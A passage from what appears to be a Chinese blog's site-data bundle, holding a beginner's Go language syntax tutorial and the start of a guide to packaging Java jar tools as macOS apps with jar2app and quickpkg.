Test(4)\n\tfmt.Println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n但是这种方式虽然写起来比较简便，但是效率并不高。多次嵌套调用会占用大量的系统资源。\n\n\n# 工程\n\n\n# 数据格式\n\n\n# 数组\n\n\n# 切片\n\n\n# 字符串\n\n\n# 字典Map\n\n\n# 结构体struct\n\n\n# 指针\n\n\n# 面向对象\n\n\n# 异常\n\n\n# 文本处理',normalizedContent:'# go语言基础语法\n\n\n# 简介\n\ngo语言是一种类c的语言，执行效率较高，在安全方面比较适合用来编写扫描器。扫描速度会比python快不少。同时如果go语言也可以用来开发服务器，在高并发的场景下适应能力比较好。所以从安全方面来说，go语言值的学习，一方面是开发一些工具；另一方面，如果遇到go语言开发的项目，也可以进行相关的代码审计。\n\n注释，从最简单的注释开始说起，go语言中的注释和java语言、c语言一样。除了没有java语言中的文档注释。如下所示：\n\npackage main\n\nimport "fmt"\n\nfunc main() {\n  // 单行注释\n  /*\n\t\t多行注释\n\t*/\n  fmt.println("hello world")\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 数据类型\n\n\n# 变量\n\n声明，go语言中使用var进行变量的声明，变量声明的格式如下，注意，在go语言中，变量声明之后必须要使用。\n\nvar a int\nvar b int\nvar c, d int\nprint(a, b, c, d) // 0000\n\n\n1\n2\n3\n4\n\n\n初始化，在声明变量的同时，可以对情进行初始化，如果没有进行初始化，则go语言会给变量一个默认的值。\n\n\tvar a int = 10\n\n\n1\n\n\n赋值，出了在声明变量的时候完成变量的初始化以外，还可以在变量定义之后变量赋值，先声明后赋值的模式：\n\nvar a int\na = 10\nprint(a)\n\n\n1\n2\n3\n\n\n自动推导类型，我们在声明变量的时候也可以不指定变量的类型，根据变量后面的赋值语句由go自己推导当前变量的类型：\n\na := "abc"\nprint(a)            // 10 +1.000000e+001 abc\nfmt.printf("%t", a) // int float64 string\n\n\n1\n2\n3\n\n\n多重赋值，当我们需要给多个变量赋值时，可以使用多重赋值的方式。多重赋值同样支持自动类型推导。\n\na, b, c, d := 1, 1.1, "aaa", \'a\'\nfmt.println(a, b, c, d)\nfmt.printf("%t\\t%t\\t%t\\t%t\\n", a, b, c, d)\n\n//1 1.1 aaa 97\n//int     float64 string  int32\n\n\n1\n2\n3\n4\n5\n6\n\n\n匿名变量，我们可以使用_去接收一个我们不想要的变量，这个在后面的函数调用接收返回值的时候非常有用，这里记住就好。\n\na, _, b, _, c := 1, 2, 3, 4, 5\nfmt.println(a, b, c)\n// 1 3 5\n\n\n1\n2\n3\n\n\n打印输出，在go语言中有多种输出方式，第一种输出方式是采用fmt.println的方式，这种输出会将参数打印出来，并换行。还有一种是fmt.printf这种输出方式可以定义输出的格式，类似于c语言中的printf()。\n\na := 10\nb := 20\nfmt.println("a=", a, ",b=", b) //a= 10 ,b= 20\n\n\n1\n2\n3\n\n\n格式化输出的相关语法和占位符在后面fmt相关的章节中介绍。\n\n接收输入，出了可以输出内容，还可以从控制台上接受用户输入的值，存储到变量中。和c很像。\n\nvar age int\nfmt.scanf("%d", &age)\nfmt.println("age=", age)\n\n// 20\n//age= 20\n\n\n1\n2\n3\n4\n5\n6\n\n\n另外一种获取用户输入的方式是直接使用fmt.scan：\n\nvar age int\nfmt.scan(&age)\n\nfmt.println("age=", age)\n\n//30\n//age= 30\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 数据类型\n\ngo语言中有多种数据类型。如下表所示：\n\n类型          名称     长度   零值      说明\nbool        布尔类型   1    false   其值不为真即为假，不可以用数字代表true或false\nbyte        字节型    1    0       uint8别名\nint, uint   整型     -    0       有符号32位或无符号64位\nint8        整型     1    0       -128 ~ 127,\nuint8       整型     1    0       0 ~ 255\nint16       整型     2    0       -32768 ~ 32767,\nuint16      整型     2    0       0 ~ 65535\nint32       整型     4    0       -2147483648 到 2147483647\nuint32      整型     4    0       0 到 4294967295(42亿)\nint64       整型     8    0       -9223372036854775808到 92233720368547758070\nuint64      整型     8    0       到 18446744073709551615(1844京)\nfloat32     浮点型    4    0.0     小数位精确到7位\nfloat64     浮点型    8    0.0     小数位精确到15位\nstring      字符串         ""      utf-8字符串\n\n# 1. bool类型\n\n这个类型用于表示对还是错，常用在判断上。有true和false两种值。\n\n// 使用自动推导类型\nb := true\nfmt.println("b=", b)\nfmt.printf("b= %t\\n", b)\n//b= true\n//b= true\n\nvar b bool\nb = false\nfmt.printf("b= %t\\n type of b is %t", b, b)\n//b= false\n// type of b is bool\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 2. 浮点类型\n\n在go语言中有两种浮点数的类型，float32、float64。默认使用自动推导类型得到的是一个float64的浮点数。\n\nvar f float32\nf = 1.2\nfmt.printf("%.2f\\n", f)\n\nf2 := 1.2\nfmt.printf("f2= %f\\ntype of f2 is %t", f2, f2)\n\n//1.20\n//f2= 1.200000\n//type of f2 is float64\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 3. 字符类型\n\ngo语言中的字符类型实际上存储的是字符的ascii码，因此可以和数字进行替换。在定义的时候也是使用的数字类型byte（unit8类型的别名）。如下的例子所示：\n\nvar a byte\na = \'a\'\nfmt.printf("%c\\n", a) //a\nfmt.printf("%d", a) // 97\n\n\n1\n2\n3\n4\n\n\n\n\n# 4. 字符串类型\n\n字符串类型实际上是多个字符类型的连续，是字符的数组。字符使用单引号而字符串使用的是双引号。\n\nvar str string\nstr = "hello world"\nfmt.printf("%s", str) // hello world\n\n\n1\n2\n3\n\n\n字符串类型也可以使用scan输入：\n\nvar str string\nfmt.scanf("%s", &str) //hello world haha\nfmt.println(str)  //hello\n\n\n1\n2\n3\n\n\n在输入的时候，默认是以空格、换行作为分割符，因此只有hello被接收了。\n\n# 字符和字符串的区别\n\n 1. 字符使用单引号、字符串使用双引号\n 2. 转义符号也是一个字符\n 3. 字符串后面会有一个\\0\n\nc := \'a\'\nstr := "a"\nfmt.printf("type of c is %t\\n", c)\nfmt.printf("type of str is %t\\n", str)     \nfmt.printf("len of str is %d\\n", len(str))\nfmt.printf("str[1]: %c\\n", str[0])         \n//type of c is int32\n//type of str is string\n//len of str is 1\n//str[1]: a\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# fmt输入输出的格式\n\n在上面哦们使用到了fmt.printf、fmt.scanf输出和输入内容，在这了可以使用一些特殊的占位符，用于表示不同的格式和数据类型，如下表所示：\n\n格式   含义\n%%   一个%字面量\n%b   一个二进制整数值(基数为2)，或者是一个(高级的)用科学计数法表示的指数为2的浮点数\n%c   字符型。可以把输入的数字按照ascii码相应转换为对应的字符\n%d   一个十进制数值(基数为10)\n%f   以标准记数法表示的浮点数或者复数值\n%o   一个以八进制表示的数字(基数为8)\n%p   以十六进制(基数为16)表示的一个值的地址，前缀为0x,字母使用小写的a-f表示\n%q   使用go语法以及必须时使用转义，以双引号括起来的字符串或者字节切片[]byte，或者是以单引号括起来的数字\n%s   字符串。输出字符串中的字符直至字符串中的空字符（字符串以\'\\0‘结尾，这个\'\\0\'即空字符）\n%t   以true或者false输出的布尔值\n%t   使用go语法输出的值的类型\n%x   以十六进制表示的整型值(基数为十六)，数字a-f使用小写表示\n%x   以十六进制表示的整型值(基数为十六)，数字a-f使用小写表示\n\n\tfmt.printf("%%\\n")\n\tfmt.printf("%b\\n", 4)\n\tfmt.printf("%c\\n", 97)\n\tfmt.printf("%d\\n", 97)\n\tfmt.printf("%f\\n", 1.1)\n\tfmt.printf("%o\\n", 16)\n\tfmt.printf("%p\\n", 16)\n\tfmt.printf("%q\\n", \'1\')\n\tfmt.printf("%s\\n", "helloworld")\n\tfmt.printf("%t\\n", false)\n\tfmt.printf("%t\\n", false)\n\tfmt.printf("%x\\n", 16)\n\tfmt.printf("%x\\n", 16)\n\t\n\t//%\n\t//100\n\t//a\n\t//97\n\t//1.100000\n\t//20\n\t//%!p(int=16)\n\t//\'1\'\n\t//helloworld\n\t//false\n\t//bool\n\t//10\n\t//10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 常量\n\n变量和常量不同，变量在定义和初始化之后，可以改变变量的值。而常量一旦定义就不能改变值了。\n\nvar a int\na = 10\na = 20\n\nconst b int = 20\n//b = 30 // 错误\n\n\n1\n2\n3\n4\n5\n6\n\n\n**字面常量 **，在代码中硬编码的常量，我们给变量赋值时值、字符串的内容等都是字面常量。\n\n"abc"\n123\n1.1\nflase\n\n\n1\n2\n3\n4\n\n\niota枚举 iota枚举是一个常量的生成器，可以生成一组有规律的常量，而不用每一行都写一个常量的初始化表达式。语法是：在第一个声明的变量所在的行，iota的值是0，每多一个常量则加一。\n\nconst (\n  a = iota\n  b = iota\n  c = iota\n)\nfmt.println(a, b, c) // 0 1 2\n\n\n1\n2\n3\n4\n5\n6\n\n\n也可以只写一个iota。\n\nconst (\n  a = iota\n  b\n  c\n  d\n)\nfmt.println(a, b, c, d) // 0 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n如果iota在同一个层级，则这一行的值一样。\n\nconst (\n  a       = iota\n  b, c, d = iota, iota, iota\n  e       = iota\n  f       = iota\n)\nfmt.println(a, b, c, d, e, f) // 0 1 1 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 运算符\n\n上面一节介绍了go语言中多种数据类型，这一节是使用不同的运算符对上面提到的数据类型进行运算。有些操作符过于简单，其他语言中也都有类似的定义，这里就不赘述了。\n\n# 1. 算数运算符\n\n运算符   术语          示例         结果\n+     加           10 + 5     15\n-     减           10 - 5     5\n*     乘           10 * 5     50\n/     除           10 / 5     2\n%     取模(取余)      10 % 3     1\n++    后自增，没有前自增   a=0; a++   a=1\n--    后自减，没有前自减   a=2; a--   a=1\n\n# 2. 类型转换\n\ngo语言中不允许隐式转换，所有类型转换必须显式声明（强制转换），而且转换只能发生在两种相互兼容的类型之间。\n\n强制类型转换的方式：数据类型名(待转换的值)\n\n当大容量的数据转到小容量的数据时会丢失精度，例如float转int会丢失精度。\n\n# 3. 赋值运算符\n\n运算符   说明       示例\n=     普通赋值     c = a + b 将a + b 表达式结果赋值给 c\n+=    相加后再赋值   c += a 等价于c = c + a\n-=    相减后再赋值   c -= a 等价于c = c - a\n*=    相乘后再赋值   c *= a 等价于 c = c * a\n/=    相除后再赋值   c /= a 等价于 c = c / a\n%=    求余后再赋值   c %= a 等价于 c = c % a\n\n# 4. 关系运算符\n\n关系运算符通常用于比较两个数据之间的关系，关系运算符的运算结果是bool类型。下面是常见的一些关系运算符。\n\n运算符   术语     示例       结果\n==    相等于    4 == 3   false\n!=    不等于    4 != 3   true\n<     小于     4 < 3    false\n>     大于     4 > 3    true\n<=    小于等于   4 <= 3   false\n>=    大于等于   4 >= 1   true\n\n# 5. 逻辑运算符\n\n逻辑运算符用于对bool值进行运算，有与或非三种运算，在其他语言中有短路与、短路或等，在go语言中默认就是短路与和短路或。\n\n运算符   术语   示例       结果\n!     非    !a       如果a为假，则!a为真； 如果a为真，则!a为假。\n&&    与    a && b   如果a和b都为真，则结果为真，否则为假。\n||    或    a || b   如果a和b有一个为真，则结果为真，二者都为假时，结果为假。\n\n运算结果列表：\n\n逻辑与：\n\n表达式1    表达式2    表达式1&&表达式2\ntrue    true    true\nfalse   true    false\ntrue    false   false\nfalse   false   false\n\n逻辑或：\n\n表达式1    表达式2    表达式1||表达式2\ntrue    true    true\ntrue    false   true\nfalse   true    true\nfalse   false   false\n\n逻辑非：\n\n表达式     !表达式\ntrue    false\nfalse   true\n\n# 6. 其他运算符\n\n运算符   术语       示例   说明\n&     取地址运算符   &a   变量a的地址\n*     取值运算符    *a   指针变量a所指向内存的值\n\n后面在指针的之后，会专门使用到这两种运算符。\n\n# 7. 运算符的优先级\n\n优先级   运算符\n7     ^ !\n6     / % << >>&&^\n5     + - | ^\n4     == != < <= >= >\n3     <-\n2     &&\n1     ||\n\n\n# 流程控制\n\n\n# 分支 - 选择\n\n# if\n\n和其他的编程语言一样，在go中实现选择结构的也是if语句，只不过格式上面和其他的语言略有差异。相比而言，go语言中的if语句比其他语言中的if语句更加灵活。\n\n//相比其他语言中更灵活的写法\n// 可以在定义的时候 处理变量\nif a = 10;a==10 {\n  fmt.println("a == 10")\n}\n\n\n// if else - else if\nvar score float64\nfmt.printf("请输入您的分数：")\nfmt.scanf("%f", &score)\n\nif score >= 90 {\n  fmt.println("优秀")\n} else if score >= 80 {\n  fmt.println("良好")\n} else if score >= 60 {\n  fmt.println("及格")\n} else {\n  fmt.println("继续努力")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# switch结构\n\nswitch有两种语法格式，如下所示：\n\nvar score float64\nfmt.scanf("%f", &score)\n\nswitch score {\n  case 10:\ncase 20:\n  fmt.println("20")\n  case 30:\n  fmt.println("30")\n  case 100:\n  fmt.println("nice")\n\n  default:\n  fmt.println("others")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n和其他语言不一样，这里的case不能多层的继承，在其他语言中，使用break表示结束当前case，而在go语言中，case默认就只有一层。\n\n第二种用法是在case后面跟上判断表达式：\n\nvar score float64\nfmt.scanf("%f", &score)\nswitch {\n  case score >= 90:\n  fmt.println("优秀")\n  case score >= 80:\n  fmt.println("良好")\n  case score >= 60:\n  fmt.println("及格")\n  default:\n  fmt.println("再接再厉")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 循环\n\n循环结构顾名思义就是重复的完成某一个任务，在其他语言中可能有while、do-while、for等多种循环的格式，但是在go语言中，就只有for循环一种。\n\nfor循环的语法格式如下：\n\nfor 表达式1;表达式2;表达式3{\n\t循环体\n}\n表达式1:定义一个循环的变量，记录循环的次数\n表达式2：一般为循环条件，循环多少次\n表达式3：一般为改变循环条件的代码，使循环条件终有一天不再成立\n循环体：重复要做的事情。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n以上代码的执行顺序是：\n\n然后执行表达式2，判断循环条件是否成立，如果表达式2返回的结果为true，\n\n则执行循环体。当执行完循环体后，执行表达式3，然后执行表达式2（这时不会在执行表达式1）继续判断循环条件是否成立，\n\n如果成立则继续执行循环体，如果不成立，则跳出for循环。\n\n举例子：输出十次hello world\n\nfor i := 0; i < 10; i++ {\n  fmt.println("helloworld")\n}\n\n\n1\n2\n3\n\n\n死循环：\n\nfor {\n  fmt.println("helloworld")\n}\n\n\n1\n2\n3\n\n\n\n# 跳转语句\n\nc语言中的跳转语句常常让人诟病，因为太过灵活导致代码可读性较差。go语言中也有跳转语句，通常配合break、continue使用。\n\n# break\n\n前面我们写了一个死循环，如果想在循环里面结束这个循环，则需要用到break。如下所示：\n\nvar i int = 0\n\nfor {\n  i += 20\n  fmt.println(i)\n  if i%3 == 0 {\n    fmt.println(i)\n    break\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nbreak的作用是跳出循环。而continue的作用是跳出当前循环，进行下一次循环。如下所示：\n\nvar i int = 0\nfor {\n  i += 20\n  fmt.println("i = ", i)\n  if i%3 == 0 {\n    fmt.println("i % 3== 0")\n    continue\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 循环嵌套\n\n直接打印一个九九乘法表：\n\nfor i := 1; i <= 9; i++ {\n  for j := 1; j <= i; j++ {\n    fmt.printf("%d*%d=%d\\t", j, i, i*j)\n  }\n  fmt.println()\n}\n\n//1*1=1   \n//1*2=2   2*2=4   \n//1*3=3   2*3=6   3*3=9   \n//1*4=4   2*4=8   3*4=12  4*4=16  \n//1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  \n//1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  \n//1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  \n//1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64  \n//1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 函数\n\n函数就是将一堆代码进行重用的一种机制。函数就是一段代码，一个函数就像一个专门做这件事的人，我们调用它来做一些事情，它可能需要我们提供一些数据给它，它执行完成后可能会有一些执行结果给我们。要求的数据就叫参数，返回的执行结果就是返回值。\n\n\n# 参数列表\n\n# 普通参数列表\n\n普通参数列表的参数数量是确定的。\n\nfunc test(a int, b int) {\n\tfmt.println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n\n\n对于多个同类型的参数可以简写：\n\n// 这样写不清晰\nfunc test(a,b int, str string ,f1,f2 float64) {\n\tfmt.println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n4\n\n\n# 不定参数\n\n不定参数是指在传递参数时，参数的个数无法确定。我们可以使用…的方式代表这里有多个参数。接收到的参数以数组的形式存储。如下所示：\n\nfunc test(args ...int) {\n  for i := 0; i < len(args); i++ {\n    fmt.printf("args[%d]=%d\\n", i, args[i])\n  }\n}\n\nfunc main() {\n  test(1, 2, 3, 4, 5, 1, 1, 1, 1)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n使用range遍历不定参数，这里使用了多重赋值的方式。\n\nfor i, arg := range args {\n  fmt.println(i, arg)\n}\n\n\n1\n2\n3\n\n\n如果在遍历过程中不需要索引，但是在go语言中声明的变量必须使用，因此我们就可以使用匿名变量去接受索引值。\n\nfunc test(a int, args ...float64) {\n\tfor _, data := range args {\n\t\tfmt.println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n\n\n需要注意的是，在使用了 不定参数之后，如果需要添加一个指定名称的参数，则必须放到不定参数之前，也就是说，不定参数只能放到参数列表的最后面。\n\n// a 只能放在第一个位置\nfunc test(a int , args ... float64)  {\n\tfmt.println(a,args[0])\n}\n\n\n1\n2\n3\n4\n\n\n\n# 函数的嵌套调用\n\n和if语句可以嵌套一样，函数也可以嵌套调用，比如说我们在main函数中调用了打印函数，实际上也是嵌套调用的一种。这实际上非常好理解和编写代码，但是需要注意的是，在嵌套调用函数的时候，当传递不定参数时，需要使用如下的写法：\n\nfunc test1(args ...int)  {\n\ttest2(args...)\n}\n\nfunc test2(args ...int)  {\n\tfor _,data:=range args{\n\t\tfmt.println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n如果我们只想传递一部分参数，而不是全部，则可以使用切片的方式，这很python：\n\nfunc test1(args ...int) {\n\ttest2(args[:2]...)\n}\n\nfunc test2(args ...int) {\n\tfor _, data := range args {\n\t\tfmt.println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n具体切片的用法，会在后面提到。\n\n\n# 函数返回值\n\n# 单个返回值\n\n函数返回值顾名思义就是执行完成函数之后需要返回给调用的值，和其他语言中不同go语言可以返回多个返回值。返回值的定义语法如下：\n\n第一种写法：\n\nfunc test(args ...int) int {\n\tfmt.println("helloworld")\n\treturn 123\n}\n\n\n1\n2\n3\n4\n\n\n第二种写法：\n\n// 这种写法是先声明了一个变量\nfunc test(args ...int) (returnvalue int) {\n\tfmt.println("helloworld")\n\treturnvalue = 123\n\treturn returnvalue\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n第三种写法：\n\n// 因为第二种写法定义了一个变量 go已经知道要返回的值是什么了，因此可以省略。\nfunc test(args ...int) (returnvalue int) {\n\tfmt.println("helloworld")\n\treturnvalue = 123\n\treturn \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n对于上面的例子，可以使用下面的方式接受返回值：\n\nfunc sum(args ...int) (sum int) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\treturn\n\n}\n\nfunc main() {\n\tresult := sum(1, 2, 3, 4)\n\tfmt.println("result=", result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 多返回值\n\n多返回值实际上和单个返回值类似，只是接受的时候使用多个变量，定义的时候定义多个返回值即可。\n\n\n/*\n\t计算传入数据的总和 平均数\n*/\nfunc calc(args ...int) (sum int, div float64) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\tdiv = float64(sum) / float64(len(args))\n\t//div = float64(sum / len(args))\n\treturn\n\n}\n\nfunc main() {\n\tsum, div := calc(1, 2, 3, 4)\n\tfmt.println("sum=", sum, ",div=", div)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 函数类型\n\ngo语言中还有另一种定义和使用函数的方式就是使用函数类型，函数类型就是将函数作为一种类型来定义变量，定义的方式如下所示：\n\nfunc sum(a int, b int) int {\n\treturn a + b\n}\n\ntype myfunc func(a, b int) (sum int)\n\nfunc main() {\n\tvar fun myfunc\n\tfun = sum\n\tresult := fun(1, 2)\n\tfmt.println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n先记住这种语法，在面向对象之后就能体会到这种语法的奇妙之处。\n\n\n# 作用域\n\n# 局部变量\n\n局部变量是指在一个大括号内定义的变量，该变量的作用域就在这个大括号之内。如下所示，a是一个局部变量，只在test内部有效，当执行完test之后，a就销毁了。\n\nfunc test() {\n\ta := 1\n\tb := 20\n\tfmt.println(a, b) //1 20\n}\nfunc main() {\n\ta := 20\n\ttest()\n\tfmt.println(a) //20\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 全局变量\n\n全局变量是定义在全局的变量，也就是定义在函数之外的变量，可以被全局的使用。如下所示：\n\nvar i int = 200\n\nfunc test() {\n\ti = 100\n\tfmt.println("i=", i) // 100\n}\n\nfunc main() {\n\ttest()\n\tfmt.println(i) //100\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n总结：\n\n * 在函数外边定义的变量叫做全局变量。\n * 全局变量能够在所有的函数中进行访问\n * 如果全局变量的名字和局部变量的名字相同，那么使用的是局部变量的，小技巧强龙不压地头蛇\n\n\n# 匿名函数\n\n我们在前面定义函数的时候，都需要给函数一个名字，实际上我们可以不用给函数名字。如下所示：\n\nfunc main() {\n\tf := func() {\n\t\tfmt.println("helloworld")\n\t}\n\tf()\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n实际上我们在调用匿名函数时往往使用如下的方式：\n\nfunc main() {\n\tfunc(a, b int) {\n\t\tfmt.println("a+b=", a+b)\n\t}(1, 2)\n}\n\n\n1\n2\n3\n4\n5\n\n\n当匿名函数有返回值时，也可以接受返回值。\n\nfunc main() {\n\tx, y := func(a, b int) (sum, div float64) {\n\t\tsum = float64(a + b)\n\t\tdiv = sum / 2.0\n\t\treturn\n\t}(1, 2)\n\n\tfmt.println(x, y)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 递归函数\n\n递归函数实际上算不了是一种函数的类型，而更多的是一种算法结构，递归函数的本质就是函数自己调用自己。如下的例子计算n的阶乘：\n\nfunc test(n int) (result int) {\n\tif n == 1 {\n\t\treturn 1\n\t}\n\tresult = test(n-1) * n\n\treturn\n}\n\nfunc main() {\n\tresult := test(4)\n\tfmt.println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n但是这种方式虽然写起来比较简便，但是效率并不高。多次嵌套调用会占用大量的系统资源。\n\n\n# 工程\n\n\n# 数据格式\n\n\n# 数组\n\n\n# 切片\n\n\n# 字符串\n\n\n# 字典map\n\n\n# 结构体struct\n\n\n# 指针\n\n\n# 面向对象\n\n\n# 异常\n\n\n# 文本处理',charsets:{cjk:!0},lastUpdated:"2022/04/07, 16:17:07",lastUpdatedTimestamp:1649348227e3},{title:"Jar打包为APP",frontmatter:{title:"Jar打包为APP",date:"2022-04-20T21:00:00.000Z",permalink:"/sec/skill/jar2app",author:{name:"NineRiverSec",link:"https://github.com/NineRiverSec"},categories:["奇淫巧技","小工具"],tags:["Tools"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/203.%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80/2030.%E5%B0%8F%E5%B7%A5%E5%85%B7/00.jar%E6%89%93%E5%8C%85%E4%B8%BAapp.html",relativePath:"02.安全/203.奇淫巧技/2030.小工具/00.jar打包为app.md",key:"v-4077a5fe",path:"/sec/skill/jar2app/",headers:[{level:2,title:"有源码",slug:"有源码",normalizedTitle:"有源码",charIndex:245},{level:2,title:"有源码",slug:"有源码-2",normalizedTitle:"有源码",charIndex:245},{level:2,title:"封装DMG",slug:"封装dmg",normalizedTitle:"封装dmg",charIndex:2257},{level:2,title:"原文",slug:"原文",normalizedTitle:"原文",charIndex:3009}],excerpt:'<h1 id="jar打包app"><a class="header-anchor" href="#jar打包app">#</a> Jar打包APP</h1>\n<blockquote>\n<p>在 Mac 上运行 jar 文件（例如 Burp\\哥斯拉\\冰蝎等）每次都需要<code>java -jar xxxx.jar</code> (当然特定的程序可能还需要添加一些java的参数)，感觉太繁琐了。因此，想打包成 app 方便使用。成功打包效果图，这里给大家提供打包出来的 app。</p>\n<p>可以直接从GitHub获取：https://github.com/NineRiverSec/Mac_Tools 各位师傅点个星星吧！</p>\n</blockquote>\n',headersStr:"有源码 有源码 封装DMG 原文",content:'# Jar打包APP\n\n> 在 Mac 上运行 jar 文件（例如 Burp\\哥斯拉\\冰蝎等）每次都需要java -jar xxxx.jar (当然特定的程序可能还需要添加一些java的参数)，感觉太繁琐了。因此，想打包成 app 方便使用。成功打包效果图，这里给大家提供打包出来的 app。\n> \n> 可以直接从GitHub获取：https://github.com/NineRiverSec/Mac_Tools 各位师傅点个星星吧！\n\n那么转osX 目前来说一共是分为两种 ：\n\n * 有源码（打包的应用较大因为携带JDK）\n\n * 无源码：只有JAR包（可自己选择是否携带JDK）\n\n\n# 有源码\n\n随便git clone 一个有GUI的JAVA源码，然后打开教育优惠的IDEA 按照如下打开后进行设置\n\n\n\n然后进行构建工件\n\n\n\n会在当前目录下生成一个新的文件夹 为 out/xxx(app的名字)/bundles/就会出现 这个软件的APP了\n\n注意此方法会打包jdk环境到app里面体积较大！！！\n\n\n# 有源码\n\n安装jar2app\n\n#获取\ngit clone https://github.com/Jorl17/jar2app\ncd jar2app\nchmod +x install.sh uninstall.sh\n#安装为全局命令\nsudo ./install.sh /usr/local/bin\n#卸载命令\n./uninstall.sh /usr/local/bin\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n使用方式\n\n#导出到文件夹\njar2app test.jar out\n#导出app\njar2app test.jar out.App\njar2app test.jar test/out.App\n#设置icon\njar2app test.jar -i icon.icns\njar2app test.jar -i /awesomeicons/icon.icns\n#设置名称\njar2app test.jar -n "Amazing Application" out.app\n#绑定jre\njar2app test.jar -r /Library/Java/JavaVirtualMachines/jdk1.8.0_40.jdk\njar2app test.jar -r /compressedJDKs/jdk1.8.0_40.jdk.zip   \n#完整设置\njar2app test.jar -n "Amazing Application" out.app -i /awesomeicons/icon.icns \njar2app test.jar -n "Amazing Application" out.app -i /awesomeicons/icon.icns -r /compressedJDKs/jdk1.8.0_40.jdk.zip  \n#带jdr、落款,设置菜单名,进行打包\njar2app df_home.jar -n "df_home" app/df_home.app -i /Users/df/Pictures/logo/df_logo/Untitled.icns -c "Copyright © 2020 df Inc." -r /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk\njar2app /Users/df/Documents/发布/df_home.jar  -n "df_home" /Users/df/Documents/发布/app/df_home.app -i /Users/df/Pictures/logo/df_logo/Untitled.icns -c "Copyright © 2020 df Inc."\n#带落款,设置菜单名,进行打包\njar2app df_home.jar -n "df_home" app/df_home_0.app -i /Users/df/Pictures/logo/df_logo/Untitled.icns -c "Copyright © 2020 df Inc."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n对应参数解释\n\n-n : 就是程序运行时，在菜单栏上的名称\n\n-i : 转换成app之后，应用的logo，图片格式要使用.icns 后缀，这里提供一下png转.icns的url：https://iconverticons.com/online/\n\n-b : 可有可无的东西，这个是真的可有可无，就是一软件基础信息\n\n-v : 可有可无的东西，这个是真的可有可无，就是一软件基础信息\n\n-s : 可有可无的东西，这个是真的可有可无，就是一软件基础信息\n\n-m : 这个可以有，有了它软件启动能快一秒，没了它，app应用得去jar里面找main入口函数，所以，这个可以有，长生不老时间多的忽略这个参数。至于main入口在哪里看，用压缩包方式打开jar文件，里面找到META-INF文件下的文件打开看看就好，可以看到main主函数入口信息的。\n\n-o : 就是让这个程序执行的时候，在标题栏有个菜单可以显示\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 封装DMG\n\nquickpkg可以快速方便的把app应用打包成pkg安装包，安装quickpkg：\n\ngit clone https://github.com/scriptingosx/quickpkg.git\n\ncd quickpkg\n\n\n1\n2\n3\n\n\napp封装为pkg：\n\n./quickpkg /Users/csjar/xxxx.app --output /Users/csjar/x x x x.pkg\n\n\n1\n\n\n不加--output参数指定输出路径，默认会在quickpkg目录下生成。\n\nAPP打包成dmg：\n\n（1）打开磁盘工具，选择文件 -> 新建映像 -> 空白映像\n（2）填写映像相关信息，其中大小需要设置的比app程序大一些。\n（3）进入dmg文件，在此处打开命令行，创建Applications链接。\nln -s /Applications/ 